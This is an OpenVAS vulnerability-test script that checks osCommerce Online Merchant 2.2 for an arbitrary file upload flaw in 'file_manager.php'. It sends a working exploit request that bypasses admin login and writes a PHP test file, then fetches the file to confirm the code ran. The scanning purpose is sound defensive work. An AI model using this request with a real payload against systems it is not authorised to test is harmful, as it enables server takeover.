###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_oscommerce_40456.nasl 13960 2019-03-01 13:18:27Z cfischer $
#
# osCommerce Online Merchant 'file_manager.php' Remote Arbitrary File Upload Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/40456");
  script_xref(name:"URL", value:"http://www.oscommerce.com");
  script_oid("1.3.6.1.4.1.25623.1.0.100661");
  script_version("$Revision: 13960 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-01 14:18:27 +0100 (Fri, 01 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-06-01 17:39:02 +0200 (Tue, 01 Jun 2010)");
  script_bugtraq_id(40456);
  script_tag(name:"cvss_base", value:"4.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");

  script_name("osCommerce Online Merchant 'file_manager.php' Remote Arbitrary File Upload Vulnerability");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("oscommerce_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Software/osCommerce");
  script_tag(name:"solution", value:"Delete the file 'file_manager.php' in your 'admin' directory.");

  script_tag(name:"summary", value:"Online Merchant module for osCommerce is prone to a remote arbitrary-file-
  upload vulnerability because it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to upload arbitrary code and run
  it in the context of the webserver process. This may facilitate unauthorized access or privilege
  escalation. Other attacks are also possible.");

  script_tag(name:"affected", value:"Online Merchant 2.2 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution_type", value:"Workaround");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
include("host_details.inc");

CPE = 'cpe:/a:oscommerce:oscommerce';

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

rand = rand();

file = string("OpenVAS_TEST_DELETE_ME_", rand, ".php");
exp = string("filename=",file,"&file_contents=%3C%3F+echo+%22OpenVAS-Upload-Test%22%3B%3F%3E&submit=+++Save+++");

req = string(
        "POST ", dir, "/admin/file_manager.php/login.php?action=save HTTP/1.1\r\n",
        "Content-Type: application/x-www-form-urlencoded\n",
        "Host: ", get_host_name(), "\r\n",
        "Content-Length: ", strlen(exp), "\r\n",
        "Connection: close\r\n\r\n",
         exp);

recv = http_keepalive_send_recv(data:req, port:port, bodyonly:TRUE);

req2 = http_get(item:string(dir, "/", file), port:port);
recv2 = http_keepalive_send_recv(data:req2, port:port, bodyonly:TRUE);

if (recv2 == NULL) exit(0);
if("OpenVAS-Upload-Test" >< recv2) {

  report = string(
        "Note :\n\n",
        "It was possible to upload and execute a file on the remote webserver.\n",
        "The file is placed in directory: ", '"', dir, '"', "\n",
        "and is named: ", '"', file, '"', "\n\n",
        "You should delete this file as soon as possible!\n");

  security_message(port:port, data:report);
  exit(0);
}

exit(0);
